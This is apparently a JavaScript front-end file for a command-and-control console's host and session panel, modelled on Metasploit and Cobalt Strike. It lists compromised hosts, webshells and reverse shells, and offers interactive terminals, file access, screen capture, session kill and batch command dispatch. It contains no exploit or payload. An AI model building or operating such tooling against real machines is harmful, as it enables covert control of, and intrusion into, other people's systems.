// app-clients.js - 主机/Session 管理（参考 MSF sessions / CS beacon 列表）

app.renderClients = function() {
    // 统计数字使用全量数据（_allClients），避免筛选时数字错误
    const allClients = this._allClients || this.clients;
    const onlineCount = allClients.filter(c => c.status === 'online').length;
    const activeSessions = allClients.filter(c => c.session_state === 'active').length;
    return `
        <div style="display:flex; gap:12px; margin-bottom:16px; align-items:center; flex-wrap:wrap;">
            <div class="card" style="padding:8px 16px; display:flex; gap:16px; align-items:center;">
                <div><span style="color:#8b949e; font-size:11px;">主机总数</span> <b style="color:#e0e6ed;">${allClients.length}</b></div>
                <div><span style="color:#8b949e; font-size:11px;">在线</span> <b style="color:#3fb950;">${onlineCount}</b></div>
                <div><span style="color:#8b949e; font-size:11px;">Active Session</span> <b style="color:#58a6ff;">${activeSessions}</b></div>
            </div>
        </div>
        <div style="display:flex; gap:16px; margin-bottom:16px; align-items:center; flex-wrap:wrap;">
            <input type="text" class="input" placeholder="搜索 Session/主机名/IP/用户..." style="max-width:280px;" oninput="app.filterClients(this.value)">
            <select class="select" style="max-width:150px;" onchange="app.filterByGroup(this.value)">
                <option value="">全部分组</option>
                ${this.groups.map(g => `<option value="${g.name}">${g.name}</option>`).join('')}
            </select>
            <select class="select" style="max-width:130px;" onchange="app.filterByStatus(this.value)">
                <option value="">全部状态</option>
                <option value="online">在线</option>
                <option value="offline">离线</option>
            </select>
            <select class="select" style="max-width:140px;" onchange="app.filterBySessionState(this.value)">
                <option value="">所有 Session</option>
                <option value="active">Active</option>
                <option value="dead">Dead</option>
            </select>
            <div style="flex:1;"></div>
            <button class="btn btn-secondary" onclick="app.refreshClients()"><i class="fas fa-sync-alt"></i> 刷新</button>
            <button class="btn btn-blue" onclick="app.showGroupModal()"><i class="fas fa-layer-group"></i> 批量分组</button>
            <button class="btn btn-danger" onclick="app.batchKillSessions()"><i class="fas fa-skull"></i> 批量Kill</button>
            <button class="btn btn-primary" onclick="app.sendTaskToSelected('cmd', {command: 'whoami'})"><i class="fas fa-bolt"></i> 批量命令</button>
        </div>

        <div class="card" style="overflow:hidden;">
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#161b22; font-size:12px; color:#8b949e;">
                        <th style="padding:10px 12px; text-align:left; width:30px;">
                            <input type="checkbox" onchange="app.toggleSelectAll(this)">
                        </th>
                        <th style="padding:10px 12px; text-align:left;">Session ID</th>
                        <th style="padding:10px 12px; text-align:left;">状态</th>
                        <th style="padding:10px 12px; text-align:left;">主机名</th>
                        <th style="padding:10px 12px; text-align:left;">IP地址</th>
                        <th style="padding:10px 12px; text-align:left;">操作系统</th>
                        <th style="padding:10px 12px; text-align:left;">用户</th>
                        <th style="padding:10px 12px; text-align:left;">上线时间</th>
                        <th style="padding:10px 12px; text-align:left;">最后心跳</th>
                        <th style="padding:10px 12px; text-align:left;">操作</th>
                    </tr>
                </thead>
                <tbody id="clientTableBody">
                    ${this.clients.map(c => this.renderClientRow(c)).join('')}
                </tbody>
            </table>
            ${this.clients.length === 0 ? `
                <div style="text-align:center; padding:60px; color:#8b949e;">
                    <i class="fas fa-inbox" style="font-size:48px; margin-bottom:16px;"></i>
                    <div>暂无主机数据，启动客户端Agent即可上线</div>
                </div>
            ` : ''}
        </div>

        ${this.selectedClient ? this.renderClientDetail() : ''}
    `;
};

app.renderClientRow = function(c) {
    const isSelected = this.selectedClients.has(c.client_id);
    const sessId = c.session_id || '-';
    const state = c.session_state || 'active';
    const stateBadge = state === 'active'
        ? `<span class="badge badge-green">active</span>`
        : `<span class="badge badge-red">dead</span>`;
    // WebShell 类型标识（冰蝎模式：被动等待 C2 请求）
    const isWebshell = c.client_type === 'webshell';
    const isShell = c.client_type === 'shell';
    const typeBadge = isWebshell
        ? `<span class="badge badge-blue" title="${c.webshell_url || ''}"><i class="fas fa-globe"></i> WebShell</span>`
        : (isShell
            ? `<span class="badge" style="background:#1f6feb; color:#fff;" title="reverse_tcp raw TCP"><i class="fas fa-terminal"></i> Shell</span>`
            : `<span class="badge" style="background:#21262d; color:#8b949e;">Agent</span>`);
    // WebShell 不按心跳判定离线，显示"被动"状态；Shell 按 conn 状态判定
    const onlineBadge = isWebshell
        ? `<span class="status-online"><span class="status-dot online"></span>被动</span>`
        : (c.status === 'online'
            ? `<span class="status-online"><span class="status-dot online"></span>在线</span>`
            : `<span class="status-offline"><span class="status-dot offline"></span>离线</span>`);
    return `
        <tr class="table-row ${isSelected ? 'selected' : ''}" onclick="event.stopPropagation(); app.selectClient('${c.client_id}')">
            <td style="padding:10px 12px;">
                <input type="checkbox" ${isSelected ? 'checked' : ''} onclick="event.stopPropagation(); app.toggleClientSelect('${c.client_id}')">
            </td>
            <td style="padding:10px 12px; font-family:monospace; font-size:12px; color:#58a6ff;">
                <i class="fas fa-link" style="margin-right:4px;"></i>${sessId}
            </td>
            <td style="padding:10px 12px;">${onlineBadge} ${stateBadge} ${typeBadge}</td>
            <td style="padding:10px 12px; font-weight:600;">
                <i class="fas ${c.os === 'Windows' ? 'fa-windows' : c.os === 'Linux' ? 'fa-linux' : 'fa-desktop'}" style="margin-right:6px; color:#58a6ff;"></i>
                ${c.hostname || '未知'}
            </td>
            <td style="padding:10px 12px; font-family:monospace; font-size:12px;">${c.ip || '-'}</td>
            <td style="padding:10px 12px; font-size:12px;">${c.os || '-'} ${c.arch || ''}</td>
            <td style="padding:10px 12px; font-size:12px;">${c.username || '-'}</td>
            <td style="padding:10px 12px; font-size:11px; color:#8b949e;">${c.session_started ? c.session_started.slice(0,19).replace('T',' ') : (c.first_seen ? c.first_seen.slice(0,19).replace('T',' ') : '-')}</td>
            <td style="padding:10px 12px; font-size:11px; color:#8b949e;">${c.last_seen ? c.last_seen.slice(0,19).replace('T',' ') : '-'}</td>
            <td style="padding:10px 12px;">
                <div style="display:flex; gap:6px;">
                    <button class="btn btn-primary" style="padding:4px 8px; font-size:11px;" title="Interact（进入交互终端）" onclick="event.stopPropagation(); app.interactSession('${sessId}')">
                        <i class="fas fa-terminal"></i>
                    </button>
                    <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" title="文件管理" onclick="event.stopPropagation(); app.goToClientPage('files', '${c.client_id}')">
                        <i class="fas fa-folder"></i>
                    </button>
                    ${isWebshell ? '' : `<button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" title="屏幕监控" onclick="event.stopPropagation(); app.goToClientPage('screenshot', '${c.client_id}')">
                        <i class="fas fa-camera"></i>
                    </button>`}
                    <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" title="Kill Session（下发exit并标记dead）" onclick="event.stopPropagation(); app.killSession('${sessId}')">
                        <i class="fas fa-skull"></i>
                    </button>
                    <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" title="删除主机（从数据库移除记录）" onclick="event.stopPropagation(); app.deleteClient('${c.client_id}', '${c.hostname || c.client_id}')">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                </div>
            </td>
        </tr>
    `;
};

app.renderClientDetail = function() {
    const c = this.selectedClient;
    const recentTasks = this.tasks.filter(t => t.client_id === c.client_id).slice(0, 10);
    return `
        <div class="card" id="clientDetailPanel" style="margin-top:20px; padding:20px;">
            <h3 style="margin-bottom:16px; font-size:15px;"><i class="fas fa-info-circle" style="color:#58a6ff;"></i> Session 详情 - ${c.hostname}</h3>
            <div style="display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:20px;">
                <div>
                    <div style="font-size:11px; color:#8b949e;">Session ID</div>
                    <div style="font-family:monospace; font-size:12px; margin-top:4px; color:#58a6ff;">${c.session_id || '-'}</div>
                </div>
                <div>
                    <div style="font-size:11px; color:#8b949e;">客户端ID</div>
                    <div style="font-family:monospace; font-size:12px; margin-top:4px;">${c.client_id}</div>
                </div>
                <div>
                    <div style="font-size:11px; color:#8b949e;">系统版本</div>
                    <div style="font-size:13px; margin-top:4px;">${c.os_version || '-'}</div>
                </div>
                <div>
                    <div style="font-size:11px; color:#8b949e;">首次上线</div>
                    <div style="font-size:12px; margin-top:4px;">${c.first_seen || '-'}</div>
                </div>
                <div>
                    <div style="font-size:11px; color:#8b949e;">权限</div>
                    <div style="font-size:13px; margin-top:4px;"><span class="badge badge-green">${c.permission || 'user'}</span></div>
                </div>
                <div>
                    <div style="font-size:11px; color:#8b949e;">Session 状态</div>
                    <div style="font-size:13px; margin-top:4px;">${c.session_state === 'active' ? '<span class="badge badge-green">active</span>' : '<span class="badge badge-red">dead</span>'}</div>
                </div>
            </div>
            <h4 style="font-size:13px; margin-bottom:10px; color:#8b949e;">最近任务</h4>
            <table style="width:100%; font-size:12px;">
                <thead>
                    <tr style="color:#8b949e;">
                        <th style="text-align:left; padding:6px;">ID</th>
                        <th style="text-align:left; padding:6px;">类型</th>
                        <th style="text-align:left; padding:6px;">状态</th>
                        <th style="text-align:left; padding:6px;">时间</th>
                    </tr>
                </thead>
                <tbody>
                    ${recentTasks.map(t => `
                        <tr style="border-top:1px solid #21262d;">
                            <td style="padding:6px;">#${t.id}</td>
                            <td style="padding:6px;">${t.task_type}</td>
                            <td style="padding:6px;"><span class="badge badge-${t.status === 'completed' ? 'green' : t.status === 'pending' ? 'yellow' : 'red'}">${t.status}</span></td>
                            <td style="padding:6px; color:#8b949e;">${t.created_at?.slice(0,19).replace('T',' ') || '-'}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    `;
};

app.selectClient = function(id) {
    this.selectedClient = this.clients.find(c => c.client_id === id);
    this.render();
};

app.toggleClientSelect = function(id) {
    if (this.selectedClients.has(id)) {
        this.selectedClients.delete(id);
    } else {
        this.selectedClients.add(id);
    }
    this.render();
};

app.toggleSelectAll = function(el) {
    if (el.checked) {
        this.clients.forEach(c => this.selectedClients.add(c.client_id));
    } else {
        this.selectedClients.clear();
    }
    this.render();
};

app.refreshClients = function() { this.loadClients(); };

// 筛选：本地过滤，避免重复请求后端
app.filterClients = function(keyword) {
    if (!keyword) {
        this._filteredClients = null;
    } else {
        const kw = keyword.toLowerCase();
        this._filteredClients = (this._allClients || this.clients).filter(c =>
            (c.hostname || '').toLowerCase().includes(kw) ||
            (c.ip || '').toLowerCase().includes(kw) ||
            (c.client_id || '').toLowerCase().includes(kw) ||
            (c.session_id || '').toLowerCase().includes(kw) ||
            (c.username || '').toLowerCase().includes(kw)
        );
    }
    this.clients = this._applyClientFilters();
    this.render();
};

app.filterByGroup = function(group) {
    this._filterGroup = group;
    this.clients = this._applyClientFilters();
    this.render();
};

app.filterByStatus = function(status) {
    this._filterStatus = status;
    this.clients = this._applyClientFilters();
    this.render();
};

app.filterBySessionState = function(state) {
    this._filterSessionState = state;
    this.clients = this._applyClientFilters();
    this.render();
};

// 统一应用所有筛选条件到本地数据
// 主机管理页面只显示 Agent 类型，WebShell 已独立到 WebShell 管理页面
app._applyClientFilters = function() {
    let list = this._allClients || this.clients;
    // 默认过滤掉 WebShell 类型（已有独立的 WebShell 管理菜单）
    list = list.filter(c => c.client_type !== 'webshell');
    if (this._filterGroup) list = list.filter(c => c.group_name === this._filterGroup);
    if (this._filterStatus) list = list.filter(c => c.status === this._filterStatus);
    if (this._filterSessionState) list = list.filter(c => c.session_state === this._filterSessionState);
    if (this._filteredClients) list = this._filteredClients;
    return list;
};

app.goToClientPage = function(page, clientId) {
    this.openTab(page, clientId);
    // 文件管理打开时自动加载文件列表
    if (page === 'files') {
        setTimeout(() => this.refreshFiles(), 300);
    }
};

// SESSION 操作：Interact / Kill / 批量Kill
app.interactSession = function(sessionId) {
    const c = this.clients.find(x => x.session_id === sessionId);
    if (!c) { this._notify('Session 不存在', 'error'); return; }
    API.post(`/api/sessions/${sessionId}/interact`).then(() => {
        this.openTab('terminal', c.client_id);
        this._notify(`已进入交互模式: ${sessionId}`, 'info');
    }).catch(e => this._notify('Interact 失败: ' + e.message, 'error'));
};

app.killSession = function(sessionId) {
    if (!confirm(`确认 Kill Session: ${sessionId} ？\n这将下发 exit 命令并标记为 dead`)) return;
    API.post(`/api/sessions/${sessionId}/kill`).then(r => {
        this._notify(`Session ${sessionId} 已 kill`, 'success');
        this.loadClients();
    }).catch(e => this._notify('Kill 失败: ' + e.message, 'error'));
};

// 删除主机：从数据库移除客户端记录和关联任务（参考 MSF sessions -d / CS beacon remove）
// Kill Session 只是下发 exit 并标记 dead，记录仍保留；删除主机则彻底移除
app.deleteClient = function(clientId, hostname) {
    if (!confirm(`确认删除主机: ${hostname}？\n该操作会从数据库彻底移除该主机及其所有任务记录（不可恢复）`)) return;
    API.post(`/api/clients/${clientId}/delete`).then(r => {
        if (r.success) {
            this._notify(`主机 "${hostname}" 已删除`, 'success');
            // 根据当前页面刷新对应数据源
            if (this.page === 'webshells') {
                this.loadWebshells();
            } else {
                this.loadClients();
            }
            // 同时刷新 _allClients 缓存，避免操作页面的主机选择器残留已删除项
            this.loadClientsSilent();
        } else {
            this._notify('删除失败: ' + (r.error || '未知错误'), 'error');
        }
    }).catch(e => this._notify('删除失败: ' + (e.message || e), 'error'));
};

app.batchKillSessions = function() {
    if (!confirm('确认 Kill 所有 Active Session ？\n（参考 MSF sessions -K）')) return;
    API.post('/api/sessions/batch_kill', {}).then(r => {
        this._notify(`已 kill ${r.killed || 0} 个 session`, 'success');
        this.loadClients();
    }).catch(e => this._notify('批量 kill 失败: ' + e.message, 'error'));
};

app.sendTaskToSelected = function(type, data) {
    if (this.selectedClients.size === 0) {
        this._notify('请先选择目标主机', 'error');
        return;
    }
    this.sendTask(type, data, Array.from(this.selectedClients));
};

app.showGroupModal = function() {
    if (this.selectedClients.size === 0) {
        this._notify('请先选择目标主机', 'error');
        return;
    }
    const groupName = prompt('请输入分组名称:', 'default');
    if (groupName) {
        const loading = this._notify('正在创建分组...', 'loading', 0);
        API.post('/api/clients/group', {
            client_ids: Array.from(this.selectedClients),
            group_name: groupName
        }).then(() => {
            loading.remove();
            this.loadClients();
            this._notify('分组创建成功', 'success');
        }).catch(e => {
            loading.remove();
            this._notify('创建失败: ' + e.message, 'error');
        });
    }
};

app._refreshClientTable = function() {
    const tbody = document.getElementById('clientTableBody');
    if (tbody) {
        tbody.innerHTML = this.clients.map(c => this.renderClientRow(c)).join('');
    }
    const detailEl = document.getElementById('clientDetailPanel');
    if (detailEl && this.selectedClient) {
        const updated = this.clients.find(c => c.client_id === this.selectedClient.client_id);
        if (updated) {
            this.selectedClient = updated;
        }
    }
};
